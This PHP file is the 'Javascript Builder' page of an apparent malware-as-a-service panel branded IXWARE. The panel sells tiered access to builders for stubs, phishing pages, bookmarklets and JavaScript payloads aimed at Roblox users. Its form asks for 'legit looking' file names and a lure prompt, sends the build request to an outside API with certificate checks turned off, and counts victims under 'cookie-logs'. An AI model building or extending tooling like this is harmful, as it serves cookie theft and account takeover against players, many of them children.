<?php 
      @session_start();
      $title = 'Javascript Builder';
      include_once 'includes/layout/header.php';
      include_once 'includes/checks.php';
      include_once 'includes/botconfig.php';
      include_once __DIR__.'/../vendor/autoload.php';

      $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $activated = pdoQuery($db, "SELECT `expireActivate` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $discordID = pdoQuery($db, "SELECT `discordID` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn(0);
      
      if($banned != 0){
          
          header("location: support");
          exit();
      }
      if($activated != 0){
        header('Location: dashboard?activate');
        die();
      }
       
      if(checkMaintenance() == 'Maintenance' && $getRank != "Admin"){
        header('Location: dashboard');
        die();
      }
       
      if($discordID == 0){
        header('Location: settings.php?id');
        die();
      }
      if(isset($_SESSION['username'])){
        $username = htmlspecialchars($_SESSION['username']);
      }else{
        $username = "Unknown";
      }
?>
<?php
   if (isset($_POST['build'])){

    if (\Volnix\CSRF\CSRF::validate($_POST)) {

        if (!empty($_POST['jsFolder'])){
                        
          if (!empty($_POST['jsName'])){

                if (!empty($_POST['ToSCheck'])){

                if($getRank == "Premium"){

                  if(checkJSLinkUser(htmlspecialchars($_SESSION['ID'])) == 2){
                    $error = "You are only able to have two javascript links at the same time.";
                  }
                }
                elseif($getRank == "User"){

                  if(checkJSLinkUser(htmlspecialchars($_SESSION['ID'])) == 1){
                    $error = "You are only able to have one javascript link.";
                  }
                }

                if(empty($error)){

                  $folder = htmlspecialchars($_POST["jsFolder"]);
                  $js = htmlspecialchars($_POST["jsName"]);
                  $currentusername = htmlspecialchars(get_current_user());

                  if (strlen($folder) < 130 && strlen($js) < 130){

                      if (preg_match('/[\'^£$%&*()}{@#~?><>,|=_+¬-]/', $folder)){
                        $error = "You can't include special characters in your foldername.";
                      }                         
                      if (preg_match('/[\'^£$%&*()}{@#~?><>,|=_+¬-]/', $js)){
                        $error = "You can't include special characters in your javascript name.";
                      }
                      if (strpos($folder, ".") !== false) {
                        $error = "You can't include any dot in your folder name.";
                      }
                      if (strpos($js, ".") !== false) {
                        $error = "You can't include any dot in your javascript name.";
                      }
                      if (preg_match('/\s/', $folder)){
                          $error = "You can't include a whitespace in your foldername!";
                      }
                      if (preg_match('/\s/', $js)){
                          $error = "You can't include a whitespace in your jsname!";
                      }
                      if(preg_match('/[A-Z]/', $folder)){
                        $error = "Lowercase letter's only at the moment.";
                      }
                      if(preg_match('/[A-Z]/', $js)){
                        $error = "Lowercase letter's only at the moment.";
                      }

                      if(empty($error)){

                          //newAPI
                          $id = getID(50);
                          if(checkJSLink($id) == 0){

                            $hash = encrypt(hash('sha256', '877692' . UnixTimeStamp()));
                            $userID = encrypt(htmlspecialchars($_SESSION['ID']));

                            if (!empty($_POST['promptCheck'])){
                              if (!empty($_POST['msgPrompt'])){
                                $isPrompt = "true";
                                $msgPrompt = htmlspecialchars($_POST['msgPrompt']);
                              }else{
                                $error = "Please enter a prompt message.";
                              }
                            }else{
                              $isPrompt = "false";
                              $msgPrompt = "0";
                            }

                            if(empty($error)){

                              $ch = curl_init();
                              curl_setopt($ch, CURLOPT_URL,"https://rblx-api.com/jsAPI.php");
                              curl_setopt($ch, CURLOPT_POST, 1);
                              curl_setopt($ch, CURLOPT_POSTFIELDS, array("Security" => $hash, "jsID" => encrypt($id), "isPrompt" => encrypt($isPrompt), "msgPrompt" => encrypt($msgPrompt), "jsName" => encrypt($js), "folderName" => encrypt($folder), "identify" => $userID));
                              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
                              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                          
                              $server_output = curl_exec($ch);
                              curl_close($ch);
                              //$output = decrypt($server_output);
                              
                              
                              header("location: jsBuilds");
                              exit();
                            }
                          }
                      }
                  }
                  else{
                      $error = "Folder or JS name is too long!";
                  }
                }
              }else{
                  $error = "You need to agree to the Terms of Service.";
              }
          }else{
              $error = "You need to enter a javascript name.";
          }
      }else{
          $error = "You need to enter a folder name.";
      }
    }else{
      header("HTTP/1.1 401 Unauthorized");
      echo file_get_contents('includes/layout/error/401.php');
      die();
    }
  }
?>

  <body class="bg-dark">
  <!--Main Navigation-->
  <header>
    <!-- Sidenav -->
    <nav id="sidenav-1" class="sidenav bg-dark" data-hidden="false" data-accordion="true">
      <a class="ripple d-flex justify-content-center py-4" href="#!" data-ripple-color="primary">
        <img id="IXWARE Logo" src="resources/img/ixwarelogogif.gif" alt="IX Logo" draggable="false" class="same-size-logo" />
      </a>

      <ul class="sidenav-menu">
        <li class="sidenav-item ml-4 mt-2 mb-1 text-white">
          <span>General</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="dashboard">
            <i class="fas fa-tachometer-slow fa-fw mr-3"></i><span>Dashboard</span>
          </a>
        </li>
        <?php
          if ($getRank == "User" || $getRank == "Admin"){
            echo "<li class='sidenav-item'>
            <a class='sidenav-link' href='purchase'>
              <i class='fas fa-shopping-basket fa-fw mr-3'></i><span>Purchase</span>
            </a>
          </li>";
          }
        ?>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Managing</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-users fa-fw mr-3"></i><span>Bots</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){

                echo "<li class='sidenav-item'>
                 <a class='sidenav-link' href='bots'>Stubs <span class='badge bg-danger ml-2' id='bot-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBots'>Phishing <span class='badge bg-danger ml-2' id='ps-logs'>0</span></a>
                </li>";
              }elseif($getRank == "User"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-shield-virus fa-fw mr-3"></i><span>Builder</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builder'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link active' href='jsBuilder'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilder'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilder'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-file-download fa-fw mr-3"></i><span>Builds</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builds'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilds'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilds'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-tools fa-fw mr-3"></i><span>Tools</span>
          </a>
          <ul class="sidenav-collapse">
            <li class='sidenav-item'>
              <a class='sidenav-link' href='watchlist'>Watchlist</a>
            </li>
          </ul>
        </li>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Account</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-sliders-h fa-fw mr-3"></i><span>Settings</span>
          </a>
          <ul class="sidenav-collapse">
            <li class="sidenav-item">
              <a class="sidenav-link" href="settings">General</a>
            </li>
            <li class="sidenav-item">
              <a class="sidenav-link" href="builder-settings">Builder</a>
             </li>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="ix-licenses">
            <i class="fab fa-keycdn fa-fw mr-3"#></i><span>Licenses</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="support">
            <i class="fas fa-question-circle fa-fw mr-3"#></i><span>Support</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="logout">
            <i class="fal fa-sign-out fa-fw mr-3"></i><span>Logout</span>
          </a>
        </li>
      </ul>
    </nav>
    <!-- Sidenav -->

    <!-- Navbar -->
    <nav
      id="main-navbar"
      class="navbar navbar-expand-lg navbar-light fixed-top bg-dark"
    >
      <!-- Container wrapper -->
      <div class="container-fluid">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item text-white">Javascript Builder</li>
          </ol>
        </nav>
        <!-- Toggler -->
        <button
          data-toggle="sidenav"
          data-target="#sidenav-1"
          class="btn shadow-0 p-0 mr-3 d-block d-xxl-none"
          aria-controls="#sidenav-1"
          aria-haspopup="true"
        >
          <i class="fas fa-bars fa-lg"></i>
        </button>

        <!-- Right links -->
        <ul class="navbar-nav ml-auto d-flex flex-row">

          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2 text-white">
              <?= $username ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2">
              <?php
                if ($getRank == "User"){
                  echo "<span class='badge bg-light text-dark'>Default</span>";
                }elseif ($getRank == "Admin"){
                  echo "<span class='badge bg-danger'>Administrator</span>";
                }elseif ($getRank == "Premium"){
                  echo "<span class='badge bg-warning text-dark'>Premium</span>";
                }
              ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0">
<?php
		            $getAvatar = pdoQuery($db, "SELECT `avatarURL` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $av = htmlspecialchars($getAvatar);
                if ($av == '0' || empty($av)){
                  echo "<img src='resources/img/logo.png' class='img-fluid rounded-circle profile-size' alt='' />";
                }else{
                  echo "<img src='$av' class='img-fluid rounded-circle profile-size' alt='' />";
                }
              ?>
            </a>
          </li>
        </ul>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->


  <!--Main layout-->
  <main style="margin-top: 100px" class="d-flex ml-5 mr-5">
    <div class="container-fluid">
        <div class="row">
            <div class="col-xl-4">
                <div class="card bg-dark">
                  <div class="card-body d-flex flex-column">
                      <ul class="nav md-pills pills-dark pills-secondary nav-justified d-flex flex-column mb-3">
                            <li class="nav-item">
                                <a class="nav-link active btn btn-transparent" data-toggle="tab" href="#builder" role="tab">Javascript Builder</a>
                            </li>
                        </ul>
                  </div>
                </div>
            </div>
            <div class="col-xl-8">
                <?php
                    if(!empty($error)){
                        echo '<div class="animated fadeIn ml-3">'.error(htmlspecialchars($error)).'</div>';
                    }
                    if(!empty($success)){
                        echo '<div class="animated fadeIn ml-3">'.success(htmlspecialchars($success)).'</div>';
                    }
                ?>
                <div class="card bg-dark">
                  <div class="card-body d-flex flex-column">
                        <?php
                            if(isset($_SESSION['JSLink1'])){

                                $value = htmlspecialchars($_SESSION['JSLink1']);
                                echo "<p class='font-weight-bolder text-left text-darkwhite'>Successfully built.</p><p class='font-weight-bolder text-left text-darkwhite'>$value</p>";

                                unset($_SESSION['JSLink1']);
                            }else{

                                echo "<form class='md-form md-form-resized' method='POST'>
                                <div class='tab-content tab-content-resized text-white' id='pills-tabContent'>
                                <div class='tab-pane fade show active' id='builder' role='tabpanel'>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='promptCheck' id='promptCheck' name='promptCheck' />
                                        <label class='form-check-label mt-2' for='promptCheck'>Show Prompt</label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='texturesCheck' id='texturesCheck' name='texturesCheck' />
                                        <label class='form-check-label mt-2' for='texturesCheck'>Redirect to textures</label>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-4'>
                                      <p class='text-darkwhite'>Prompt Message</p>
                                      <input type='text' id='msgPrompt' placeholder='Enter the ID of the item you want to snipe!' name='msgPrompt' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-3'>
                                      <p class='text-darkwhite'>Folder Name</p>
                                      <input type='text' id='jsFolder' placeholder='Enter a legit looking folder name' name='jsFolder' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-3'>
                                      <p class='text-darkwhite'>Javascript Name</p>
                                      <input type='text' id='jsName' placeholder='Enter a legit looking javascript name' name='jsName' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2 mt-5 mb-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='tos' id='ToSCheck' name='ToSCheck' />
                                        <label class='form-check-label mt-2' for='ToSCheck'>I have read and I agree to the <a href='terms-of-service' target='_blank' class='text-primary'><b> Terms of Service</b></a></label>
                                    </div>
                                    <button id='load-button' type='submit' name='build' value='buildJS' class='btn btn-outline-primary waves-effect mt-auto' style='width:100%;'>Build</button>
                                    <input type='hidden' name='" . \Volnix\CSRF\CSRF::TOKEN_NAME . "' value='" . \Volnix\CSRF\CSRF::getToken() . "'/>
                                  </div>
                                </div>
                            </form>";
                            }
                        ?>                    
                  </div>
                </div>
            </div>
        </div>
    </div>
  </main>
  <!--Main layout-->


  <?php require_once 'includes/layout/footer.php'; require_once 'includes/realtime.php';?>